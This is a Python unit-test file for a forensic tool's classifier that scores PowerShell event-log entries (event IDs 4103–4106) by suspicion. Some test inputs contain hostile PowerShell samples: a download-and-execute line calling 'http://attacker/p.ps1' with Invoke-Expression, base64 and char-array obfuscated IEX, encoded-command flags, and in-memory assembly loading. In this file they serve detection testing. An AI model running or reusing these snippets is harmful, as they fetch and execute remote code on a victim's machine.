"""Tier-1 tests for the Phase η.E PowerShell event-log classifier.

Covers ``_classify_powershell_event`` (module-level helper in
``app.services.finding_service``) — the heuristic that maps PowerShell
EIDs (4103 Module/Pipeline / 4104 ScriptBlock / 4105/4106 noise) to a
(Confidence, title) tuple OR None.

This file is pure-unit (no DB, no fixtures). The integration test
that wires the classifier into ``emit_evtx_findings_from_walk`` lives
in ``test_finding_service.py`` (existing) — this file isolates the
classifier so confidence-tier regressions surface without DB setup.
"""

from __future__ import annotations

from app.schemas.finding import Confidence
from app.services.finding_service import _classify_powershell_event


def test_classify_powershell_4103_module_load_returns_low():
    result = _classify_powershell_event(
        4103,
        "<Event><EventID>4103</EventID></Event>",
    )
    assert result is not None
    confidence, title = result
    assert confidence is Confidence.low
    assert "module-load" in title.lower()
    assert "4103" in title


def test_classify_powershell_4104_plain_script_returns_medium():
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>Get-ChildItem; Write-Host 'hello'</EventData>"
        "</Event>",
    )
    assert result is not None
    confidence, title = result
    assert confidence is Confidence.medium
    assert "scriptblock" in title.lower()
    assert "4104" in title


def test_classify_powershell_4104_with_FromBase64String_returns_high():
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>$x = [Convert]::FromBase64String($enc); IEX $x</EventData>"
        "</Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high


def test_classify_powershell_4104_with_EncodedCommand_returns_high():
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>powershell.exe -EncodedCommand SQBuAHYAbwBrAGUA</EventData>"
        "</Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high


def test_classify_powershell_4104_with_short_enc_flag_returns_high():
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>powershell.exe -enc SQBuAHYAbwBrAGUA</EventData>"
        "</Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high


def test_classify_powershell_4104_with_Invoke_Expression_returns_high():
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>$payload = (New-Object Net.WebClient)."
        "DownloadString('http://attacker/p.ps1'); "
        "Invoke-Expression $payload</EventData></Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high


def test_classify_powershell_4104_with_char_array_returns_high():
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>$cmd = -join [char[]](73,69,88,32,36,99); &amp; $cmd"
        "</EventData></Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high


def test_classify_powershell_4105_returns_none():
    """Pipeline state-change events (4105/4106) are NOISE — not emitted."""
    result = _classify_powershell_event(
        4105,
        "<Event><EventID>4105</EventID></Event>",
    )
    assert result is None


def test_classify_powershell_4106_returns_none():
    result = _classify_powershell_event(
        4106,
        "<Event><EventID>4106</EventID></Event>",
    )
    assert result is None


def test_classify_powershell_unrelated_eid_returns_none():
    """EIDs outside the PowerShell range pass through to the per-record
    loop's ``else: continue`` branch — the classifier itself returns
    None to signal "skip this record."
    """
    for eid in (0, 1, 100, 1000, 4624, 4625, 5000):
        result = _classify_powershell_event(
            eid,
            f"<Event><EventID>{eid}</EventID></Event>",
        )
        assert result is None, f"EID {eid} should not classify as PowerShell"


def test_classify_powershell_4104_with_DownloadString_returns_high():
    """The .DownloadString( pattern (Net.WebClient downloader) is a
    canonical 2024-2025 in-the-wild PowerShell tradecraft pattern.
    """
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>(New-Object Net.WebClient).DownloadString($url)"
        "</EventData></Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high


def test_classify_powershell_4104_with_Reflection_Assembly_returns_high():
    """In-memory assembly load via [Reflection.Assembly]::Load is a
    common .NET-payload-execution pattern.
    """
    result = _classify_powershell_event(
        4104,
        "<Event><EventID>4104</EventID>"
        "<EventData>[Reflection.Assembly]::Load($payload)</EventData>"
        "</Event>",
    )
    assert result is not None
    confidence, _ = result
    assert confidence is Confidence.high
